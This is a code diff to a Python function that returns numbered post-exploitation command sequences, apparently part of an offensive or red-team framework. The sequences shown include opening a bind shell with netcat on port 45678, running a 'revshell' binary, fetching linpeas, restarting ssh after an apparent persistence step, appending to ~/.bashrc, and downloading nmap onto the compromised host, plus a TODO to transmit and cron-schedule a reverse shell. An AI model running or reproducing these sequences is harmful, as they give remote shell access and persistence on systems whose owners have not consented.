@@ -1,6 +1,3 @@
-from post.postexploit import openCtrlSrv
-
-
 def getsequence(id=0, srv=""):
     match id:
         case 0:
@@ -36,6 +33,7 @@ def getsequence(id=0, srv=""):
                 "/etc/init.d/ssh restart",
                 "echo get persisted kid",
             ]
+        # TODO remove ?
         case 4:
             SEQUENCE = [
                 "whoami",
@@ -46,6 +44,7 @@ def getsequence(id=0, srv=""):
                 "chmod +x linpeas.sh",
                 "echo matthislemechan",
             ]
+        # TODO remove ?
         case 5:
             SEQUENCE = [
                 "cd /root",
@@ -59,8 +58,10 @@ def getsequence(id=0, srv=""):
                 "echo pwnguined",
                 "nc -l -p 45678 -e /bin/bash",
             ]
+        # TODO remove ?
         case 6:
             SEQUENCE = ["whoami", "echo 'pwnguined' >> ~/.bashrc"]
+        # TODO modify sequence: generate + transmit + cron of the revshell
         case 7:
             SEQUENCE = [
                 "whoami",
@@ -68,8 +69,11 @@ def getsequence(id=0, srv=""):
                 "chmod +x revshell",
                 "./revshell",
             ]
-        case 8 :
-            SEQUENCE = ["cd ~",
-              "curl -L https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap",
-              "PATH=$PATH:."]
+        case 8:
+            SEQUENCE = [
+                "cd ~",
+                "curl -L https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap",
+                "chmod +x ./nmap",
+                "PATH=$PATH:.",
+            ]
     return SEQUENCE
